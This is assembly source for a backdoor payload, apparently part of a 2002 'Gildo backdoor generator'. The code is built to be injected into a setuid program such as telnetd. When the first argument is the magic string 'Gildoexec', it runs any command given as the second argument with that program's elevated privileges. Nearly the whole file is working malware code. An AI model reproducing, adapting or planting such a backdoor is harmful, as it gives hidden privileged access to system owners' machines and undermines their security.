/* asm/Gildoexec_safe.nasm   asm code of a backdoor
 *
 * Gildo backdoor generator is copyright (C) 2002 Mauro Meneghin.
 * All rights reserved. The software is redistributable under
 * the licence given in the file "Licence" distributed in the
 * Gbkdoor archive.
 */


;this code will simply execute argv[2]
;given as argument if the argv[1] is Gildoexec
;example:
;telnetd Gildoexec "/bin/ls /root"
;(where telnetd is a suid program infected by the backdoor)

global _start

_start:
;params on the stack are:
;[esp]=argc
;[esp+4]=argv[0]
;[esp+8]=argv[1]
;...
;0=[esp+n*4]=end of argv vector
;[esp+(n+1)*4]=env[0]
;[esp+(n+2)*4]=env[1]
;...
;0=end of env vector

	mov eax,[esp]	;test for argc>2
	cmp al,2
	jbe exit

%ifdef DEBUG
	mov eax,4	;write
	mov ebx,1
	mov ecx,[esp+8]
	mov edx,10
	int 80h
%endif

compare:
;compare argv[1] with Gildoexec
	cld
	xor ecx,ecx
	mov cl,10
	mov esi,[esp+8]
	jmp addr_string_Gildoexec
.got_string:
	pop edi		;edi is string_Gildo (position independent version)
	repe cmpsb
	jne exit
	

;if equal exec argv[2]
%ifdef DEBUG
	mov eax,4	;debug, write string_OK
	mov ebx,1
	mov ecx,string_OK
	mov edx,43
	int 80h
%endif

	xor eax,eax	;execve(argv[2],&argv[2],NULL)
	mov al,11	;execve(argv[2],&argv[2],NULL)
	lea ecx,[esp+0ch]
	mov ebx,[ecx]
	xor edx,edx
	int 80h



exit:
	xor eax,eax
	inc eax
	int 0x80

addr_string_Gildoexec:
	call compare.got_string
string_Gildoexec db 'Gildoexec', 0
string_OK db 'all right, the argument match "Gildoexec"',10,0

